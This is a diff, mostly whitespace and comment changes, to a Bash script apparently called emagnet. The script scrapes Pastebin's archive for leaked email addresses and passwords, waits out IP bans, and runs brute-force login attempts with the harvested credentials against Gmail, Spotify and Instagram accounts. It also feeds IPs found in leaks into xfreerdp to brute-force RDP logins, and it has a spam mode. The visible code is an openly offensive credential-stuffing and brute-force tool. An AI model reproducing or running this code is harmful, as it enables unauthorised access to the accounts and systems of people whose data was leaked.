@@ -44,9 +44,6 @@
 ####                                                                       ####
 ###############################################################################
 
-
-
-
 ###############################################################################
 ## Want your own banner? Cool, just replace the ascii below               ####
 ###############################################################################
@@ -244,7 +241,7 @@ curl -sL -H "$USERAGENT" "$PASTEBIN" \
       ((temp_cnt--))
       done
       echo
-	  bash "$basename$0" --emagnet
+      bash "$basename$0" --emagnet
       done
       bash "$basename$0" --emagnet
 fi
@@ -267,26 +264,26 @@ if [[ "$?" = "0" ]]; then
   		if [[ "$VPN" = "false" ]]; then
                     emagnet_clear
                     emagnet_banner
-   	   	   for (( ; ; )); do
+   	   	           for (( ; ; )); do
                     wait_time=${IDLETIME}
       		        temp_cnt=${wait_time}
-   		   while [[ "${temp_cnt}" -gt "0" ]]; do
-                    printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
-                    printf " seconds"
-      		        sleep 1
-      		        ((temp_cnt--))
-  	            done
+   		             while [[ "${temp_cnt}" -gt "0" ]]; do
+                       printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
+                       printf " seconds"
+                       sleep 1
+      		           ((temp_cnt--))
+  	                 done
                     printf "\n"
                     emagnet_clear
                     emagnet_banner
                     bash "$basename$0" --emagnet
                     sleep 2
-           done
+                    done
                     emagnet_clear
                     emagnet_banner
-         	        bash "$basename$0" --emagnet
+         	    bash "$basename$0" --emagnet
                     exit 1
-      else
+       else
                     emagnet_banned
       fi
 fi
@@ -373,7 +370,7 @@ else
               echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
               sleep 10
               MYIP="$(curl -s https://nr1.nu/i/)"
-		          if [[ ! "$MYIP" = "$MYOLDIP" ]]; then
+		   if [[ ! "$MYIP" = "$MYOLDIP" ]]; then
                       rm "$HOME/.config/emagnet/tmp/.emagnet-ip" &> /dev/null
                       MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
                       printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
@@ -496,7 +493,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	    sed -i '129 i RBRUTEFORCE=false' "$CONF"     	    
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -511,7 +508,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -542,7 +539,7 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
             sed -i '128d' "$CONF"
      	    sed -i '128 i IBRUTEFORCE=true' "$CONF"
             sed -i '129d' "$CONF"
-     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF"
             emagnet_conf
             printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -584,9 +581,9 @@ hash xfreerdp &> /dev/null
 ( [[ $? -eq "0" ]] || echo -e "$basename$0: internal error -- xfreerdp is required to be installed"; exit 1 )
 emagnet_conf
 if [[ -z "$rdpPASS" ]]; then
-   echo -e "You must set a password to use during the attack"
-   read -p "Enter a password or hit enter for default (Default: qwerty) " rdppassb
-   echo ""
+       echo -e "You must set a password to use during the attack"
+       read -p "Enter a password or hit enter for default (Default: qwerty) " rdppassb
+       echo ""
      if [[ -n "$rdppassb" ]]; then
        sed -i '199d' "$CONF"
        sed -i "199 i rdppassb=$rdppassb" "$CONF"
@@ -614,7 +611,6 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         printf "\n%15s";printf "BRUTE FORCING \e[1;31mRDP\e[0m TARGETS\e[0m\n\n"
         sleep 2
        while read line; do
-       #timeout 0.5
          xfreerdp --ignore-certificate --authonly -u $RDP_USERNAME -p $RDP_PASSWORD $line &> test
          cat test|grep -q "ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED"
             if [[ $? != "0" ]]; then
@@ -876,11 +872,11 @@ emagnet_main() {
            grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d: -f1|tr ' ' '\n'
 	       printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned anytime now..\n\n"
            tt="\e[1;31m\e[5m00\e[0m"
-      	   sleep 5 # Sleep here for make some room, this will not cause any problems with missing files
+      	   sleep 5
            emagnet_clear;emagnet_banner
          else
            echo -e "\n===================================================================\nPastebin URLS from: $(date +%d/%m/%Y\ -\ %H:%M)\n==================================================================="  >> "$EMAGNETLOGS/pastebin-urls.txt"
-           # cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
+           cat "$HOME/.config/emagnet/tmp/.emagnet" >> "$EMAGNETLOGS/pastebin-urls.txt"
            curl -H "$USERAGENT" -Ls "pastebin.com/archive"|awk -F'href="/' '{print $2}'|cut -d'"' -f1|awk 'length($0)>6 && length($0)<9'| \
            grep -v 'archive\|contact\|settings\|messages\|signup\|index.html' |\
            sed 's/^/https:\/\/pastebin.com\/raw\//g'|sed 's/$/ - Downloaded /g' > 1
@@ -976,7 +972,7 @@ emagnet_run4ever() {
        if [[ "$?" = "0" ]]; then
          if [[ "$VPN" = "true" ]]; then
            emagnet_banned
-         else
+          else
            emagnet_I_was_banned;
          fi
        fi
@@ -1009,12 +1005,10 @@ emagnet_run4ever() {
 }
 
 emagnet_first_run() {
-# Emagnet wont run on default installed MacOSX systems since they using a very old version since 2007
-# Upgrade your bash version or even better for your own safety, move to Linux! :-)
         emagnet_bashversion() {
         BASH_VERSION="$(bash --version|grep -o version..|head -n1|awk '{print $2}')"
         if [[ $BASH_VERSION -lt "4" ]]; then echo -e "$basename$0: internal error -- you must install bash 4.3.4 or newer for emagnet to work properly"; fi;}
-    if ! [[ -f "$CONF" ]]; then
+        if ! [[ -f "$CONF" ]]; then
 	    echo "Please wait, generating emagnet.conf for you ..."
         emagnet_requirements
         emagnet_required_stuff
@@ -1096,20 +1090,20 @@ case "${1}" in
               fi
 
            elif [[ "$2" = "spotify" ]]; then
-          emagnet_conf
+           emagnet_conf
                find /usr/include -type d |grep 'libspotify' &> /dev/null
              if [[ "$?" -ne "0" ]]; then
              if [[ -z "$LIBSPOTIFY" ]]; then
-	       printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
+	           printf "Libspotify is deprecated but is required for emagnet bruteforcing\nto work, do you have libspotify installed? (YES/no): "
                read LIBSPOTIFY
                  if ! [[ "$LIBSPOTIFY" = "YES" ]]; then
                    echo "Can't continue until libspotify has been installed.."
-      		   echo "Exiting.."
-       		   exit 1
-         	 fi
-               sed -i '243d' "$CONF"
-               sed -i '243 i LIBSPOTIFY=true' "$CONF"
-            fi
+      		       echo "Exiting.."
+       		       exit 1
+         	     fi
+                   sed -i '243d' "$CONF"
+                   sed -i '243 i LIBSPOTIFY=true' "$CONF"
+             fi
               else
                sed -i '243d' "$CONF"
                sed -i '243 i LIBSPOTIFY=true' "$CONF"
@@ -1135,7 +1129,7 @@ case "${1}" in
                             fi
                         fi
                      sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' "$CONF"
-                  emagnet_conf
+                     emagnet_conf
 
                  if [[ "$PBRUTEFORCE" = "true" ]]; then
                                 emagnet_clear
@@ -1148,8 +1142,8 @@ case "${1}" in
                  fi
                                 mv "$EMAGNETTEMP/*" "$EMAGNETHOME/all-files" &> /dev/null
                 else
-                       printf "%s\n" "$basename$0: internal error -- not a valid option, try gmail, spotify or ssh"
-                       exit 1
+                                printf "%s\n" "$basename$0: internal error -- not a valid option, try gmail, spotify or ssh"
+                                exit 1
                 fi
                 ;;
       "-k"|"-kill"|"--kill")
@@ -1184,18 +1178,12 @@ case "${1}" in
 
       "-s"|"-spam"|"--spam")
                emagnet_conf 
-               if [[ -z "$EMAIL2SEND" ]]; then
-                 if ! [[ -f "$2" ]]; then
-                   echo -e "$basename$0: internal error -- no such file found"
-                   exit 1
-                 fi
-                fi
-
-                if [[ -n "$2" ]]; then
+               if [[ -z "$EMAIL2SEND" ]]; then if ! [[ -f "$2" ]]; then echo -e "$basename$0: internal error -- no such file found";exit 1;fi;fi
+                  if [[ -n "$2" ]]; then
                     sed -i '141d' "${CONF}"; sed -i "141 i EMAIL2SEND=$2" "${CONF}"
                     echo -e "$basename$0: config file has been updated -- text file has been set to: $2"
                     exit 1
-                fi
+                  fi
                 emagnet_requirements
                 emagnet_iconnection
                 emagnet_first_run
@@ -1246,7 +1234,6 @@ case "${1}" in
                           exit 1
                        fi
                   fi
-                # Since user already has answered if notifications works once, we set notify to truee instead of true so we know
                 if [[ $2 = "true" ]];  then sed -i '150d' "$CONF";sed -i "150 i NOTIFY=truee"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"; fi
                 if [[ $2 = "false" ]]; then sed -i '150d' "$CONF";sed -i "150 i NOTIFY=false" "$CONF";printf "$basename$0: config file has been updated -- notifications has been disable\n";fi
                 ;;
